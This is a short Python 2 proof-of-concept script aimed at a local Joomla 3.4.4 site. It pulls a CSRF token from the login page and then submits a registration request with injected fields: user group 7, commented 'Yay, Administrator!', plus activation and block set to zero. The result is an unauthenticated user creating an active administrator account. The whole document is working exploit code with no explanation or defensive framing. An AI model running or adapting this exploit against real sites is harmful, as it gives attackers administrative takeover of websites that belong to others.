#joomla 344
from bs4 import BeautifulSoup
import requests 
import re
url="http://localhost/Joomla_344/index.php"
sess=requests.Session()
res = sess.get(url)

reg_url="http://localhost/Joomla_344/index.php/component/users/?task=registration.register"
form_url="http://localhost/Joomla_344/index.php/component/users/?view=login"
'''
headers={
"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0",
"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
"Accept-Language":"en-US,en;q=0.5",
"Referer":"http://localhost/Joomla_344/index.php/log-out?view=registration",
"Connection":"keep-alive",
"Content-Type":"multipart/form-data;" 
#boundary=---------------------------19486549931596250114824662850
}
'''
password="AAAA"
name="AAAA"
email="AAAA@hack.com"

def get_token(sess):
	res_token=sess.get(form_url)
	match = re.search(r'name="([a-f0-9]{32})" value="1"',res_token.content)
	if match:
		print "Get token: " + match.group(1)
		return match.group(1)

token=get_token(sess)
data={
	"user[name]":name,
	"user[username]":name,
	"user[password1]":password,
	"user[password2]":password,
	"user[email1]": email,
	"user[email2]": email,
	'user[groups][]': '7',	# Yay, Administrator!
	# Sometimes these will be overridden
	'user[activation]': '0',
	'user[block]': '0',
	'option': 'com_users',
	'task': 'user.register',
	token: '1',
}
reg=sess.post(reg_url,data=data)
print reg.request.headers

print res.status_code


